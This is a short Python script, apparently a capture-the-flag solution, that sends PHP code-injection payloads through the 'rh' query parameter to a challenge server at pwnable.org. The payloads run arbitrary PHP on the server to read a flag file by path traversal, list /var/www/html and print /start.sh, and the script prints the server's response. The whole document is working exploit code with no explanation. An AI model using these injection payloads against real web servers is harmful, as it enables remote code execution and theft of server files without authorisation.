import requests
url = "http://pwnable.org:19260"
payload = """echo $s = base64_encode(readfile("../../../flag.so"));"""
payload = """$f = scandir("/var/www/html");var_dump($f);"""
payload = """$f = highlight_file('/start.sh');var_dump($f);"""
r = requests.Session()
print(payload)
print()
s = r.get(url+"?rh="+payload)
final = s.text
print(final)
r.close()
